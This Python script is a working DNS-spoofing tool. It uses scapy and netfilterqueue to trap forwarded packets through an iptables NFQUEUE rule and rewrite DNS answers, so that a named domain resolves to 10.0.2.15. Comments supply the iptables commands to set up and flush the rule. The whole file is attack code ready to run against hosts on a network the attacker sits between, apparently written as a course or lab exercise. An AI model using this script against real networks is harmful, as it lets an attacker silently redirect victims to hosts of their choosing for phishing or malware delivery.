#!/usr/bin/env python

# In order to trap packets in our queue we need to execute this command
# This will trap all the packets going to the FORWARD chain 

    #iptables -I FORWARD -j NFQUEUE --queue-num 0

# To test locally
    #iptables -I OUTPUT -j NFQUEUE --queue-num 0
    #iptables -I INPUT -j NFQUEUE --queue-num 0

# Flush changes
    #iptables --flush

import scapy.all as scapy
import netfilterqueue

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "mmediu.ro" in str(qname):
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            print("CHECKPOINT")
            packet.set_payload(bytes(scapy_packet))
            

    packet.accept()


# QUEUE_NUM = 0
# # insert the iptables FORWARD rule
# os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
# # instantiate the netfilter queue
# queue = NetfilterQueue()


# try:
#     # bind the queue number to our callback `process_packet`
#     # and start it
#     queue.bind(QUEUE_NUM, process_packet)
#     queue.run()
# except KeyboardInterrupt:
#     # if want to exit, make sure we
#     # remove that rule we just inserted, going back to normal.
#     os.system("iptables --flush")

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()